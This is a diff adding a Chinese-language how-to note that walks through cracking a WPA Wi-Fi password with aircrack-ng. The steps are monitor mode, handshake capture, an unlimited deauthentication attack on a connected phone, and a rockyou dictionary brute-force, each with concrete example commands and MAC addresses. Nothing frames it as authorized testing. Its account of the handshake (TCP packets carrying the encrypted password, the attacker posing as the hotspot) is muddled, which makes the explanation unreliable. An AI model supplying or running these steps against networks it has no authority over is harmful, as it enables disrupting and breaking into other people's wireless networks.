@@ -1,0 +1,30 @@
+开启网卡监听：   airmon-ng start wlan0
+
+检验网卡是否设置成功： iwconfig
+
+wifi扫描： airodump-ng wlan0mon:
+BSSID为wifi的MAC地址，PWR为信号强弱程度，数值越小信号越强；#DATA为数据量，越大使用的人就越多，CH为信道频率（频道），ESSID为wifi的名称.
+
+
+抓包：
+airodump-ng --bssid BSSID -c 信道频率 -w 抓包存储的路径 wlan0mon
+如：airodump-ng --bssid D8:63:75:2C:93:59 -c 13 -w /home/study wlan0mon
+
+
+如果抓取不到数据，新建一个终端：键入airepaly-ng -0 0 -c 连接到WiFi的手机mac地址 -a bssid 网卡名（一般为wlan0mon）
+如：aireplay-ng -0 0 -c 72:37:D8:24:42:76 -a D8:63:75:2C:93:59 wlan0mon
+(0 WiFi设备无限次数,-0 8则攻击8次。攻击原理是：先让设备掉线，设备会再自动连接，并发这个自动连接过程会进行三次握手，会发送tcp包（里面包含加密的密码数据），
+我方伪装成WiFi热点去窃取该数据包。我方窃取后即可用字典穷举法暴力破解加密的WiFi密码,数据包里面的密码是哈希加密的，哈希加密只能正向)
+
+
+
+解压字典：
+解压kali自带的字典文件 路径：/usr/share/wordlists/rockyou.txt.gz
+如 ：gzip -d /usr/share/wordlists/rockyou.txt.gz
+
+爆破：
+键入 aircrack-ng -w 字典路径 握手包路径，回车后开始爆破
+如：aircrack-ng -w /usr/share/wordlists/rockyou.txt /home/study-01.cap
+
+
+特别说明：暴力破解并不简单，需要足够强大的字典和时间，可以通过字典生成工具生成自己的字典，字典越强大越容易破解。。哈哈，也是需要点运气的！
